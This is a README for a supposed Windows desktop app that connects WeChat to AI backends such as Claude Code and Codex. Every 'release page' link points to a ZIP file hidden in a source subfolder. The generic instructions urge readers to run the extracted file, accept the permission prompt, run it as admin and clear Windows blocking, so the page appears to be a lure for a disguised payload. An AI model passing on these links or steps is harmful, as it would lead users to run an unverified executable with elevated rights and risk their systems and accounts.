# 🤖 weixin-agent-gateway - Unified WeChat AI Gateway

[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)

## 🚀 What this app does

weixin-agent-gateway is a desktop app for Windows that helps you connect WeChat with different AI backends through one simple entry point.

It separates the WeChat connection layer from the backend routing layer. This makes it easier to switch between OpenClaw, Codex, Claude Code, and other similar backends without changing how WeChat connects.

Use it when you want:

- One place to handle WeChat input
- A clean way to route messages to different AI backends
- Less setup when you change backends
- A simple Windows app you can run from a release file

## 📥 Download

Visit the release page to download and run the Windows version:

[https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)

On that page, look for the latest release and download the file that matches your Windows system. If you see more than one file, choose the one marked for Windows.

## 🖥️ System requirements

For a smooth setup, use:

- Windows 10 or Windows 11
- A modern 64-bit computer
- A stable internet connection
- A WeChat account that can log in on your device
- Enough free disk space for the app and its local files

For best results, close apps that use a lot of memory before you start.

## 🛠️ Install and run on Windows

1. Open the release page:
   [https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)

2. Find the latest release.

3. Download the Windows file from that release.

4. If the file comes in a ZIP package, right-click it and choose Extract All.

5. Open the folder that contains the app files.

6. Double-click the main app file to start it.

7. If Windows asks for permission, choose Yes.

8. Sign in to WeChat if the app asks you to.

9. Follow the on-screen setup steps to connect your chosen backend.

## 🔧 First-time setup

When you open the app for the first time, set up these items:

- WeChat entry connection
- Backend choice
- Basic routing rules
- Local port or service address, if the app asks for one
- Any key or token needed by your backend

If you want the simplest path, start with one backend first. After it works, add the others.

## 🤖 Supported backend types

This gateway is built to work with multiple AI backends at the same level. You can use it to route requests to:

- OpenClaw
- Codex
- Claude Code
- Other backends with a similar request format

This setup lets you keep WeChat as the front door and change the backend without changing your daily use.

## 🧭 Basic workflow

A normal flow looks like this:

1. A message arrives through WeChat
2. weixin-agent-gateway receives the message
3. The app sends it to the backend you chose
4. The backend returns a response
5. The app sends the reply back through WeChat

This keeps the WeChat side simple and makes backend changes easier to manage.

## ⚙️ Typical use cases

Use this app if you want to:

- Connect WeChat to one AI service
- Switch between different AI backends
- Keep your chat entry layer separate from backend logic
- Test different backend routes without changing your WeChat setup
- Run a local gateway on Windows for day-to-day use

## 📁 What you will see after download

After you download and unzip the release, you may see files like:

- The main app file
- A config file
- A folder for logs
- A folder for local data
- A readme or setup note from the release package

If the release includes a config file, open it with Notepad only if you need to change settings.

## 🧩 Suggested setup order

If you are setting this up for the first time, use this order:

1. Download the release
2. Extract the files
3. Start the app once
4. Connect WeChat
5. Choose one backend
6. Send a test message
7. Check the reply
8. Add more backends after the first path works

## 📝 Simple troubleshooting

If the app does not start:

- Check that you extracted all files
- Run the app again as admin
- Make sure Windows did not block the file
- Confirm that your Windows version is supported
- Try the latest release file again

If WeChat does not connect:

- Sign in to WeChat first
- Close other apps that may use the same port
- Check your network connection
- Restart the app
- Make sure the backend service is running

If messages do not route to the backend:

- Check the backend address
- Check any token or key you entered
- Make sure the backend format matches what the app expects
- Test one backend at a time

## 🔒 Security and local use

This app acts as a gateway between WeChat and your AI backends. Keep these points in mind:

- Store keys in a safe place
- Use trusted backends
- Review any local config before you save it
- Close the app when you do not need it
- Use a private Windows account when possible

## 🧪 Testing your setup

After install, send a short test message such as:

- Hello
- Test
- What time is it?
- Explain this message in one line

Then check:

- Does WeChat send the message?
- Does the backend reply?
- Does the reply come back in the right chat?
- Does the app stay open without errors?

If the answer is yes to all four, the setup is working

## 📌 File and config tips

When you edit settings:

- Change one item at a time
- Save a copy before you edit
- Keep the app closed while you update config files
- Use plain text editors
- Avoid changing settings you do not need

If the app uses a config file for routes, keep each backend name clear so you can tell them apart

## 📦 Download again later

Use the same release page any time you need a newer version:

[https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)

Check the newest release before you install it. This helps you stay on the current Windows build

## 🧰 Common terms

- Gateway: the bridge between WeChat and your backend
- Backend: the AI service that answers messages
- Route: the path a message takes
- Entry layer: the part that gets the WeChat message first
- Reply layer: the part that returns the response

## 📍 Quick start in one view

1. Go to the release page
2. Download the Windows file
3. Extract it if needed
4. Open the app
5. Connect WeChat
6. Choose a backend
7. Send a test message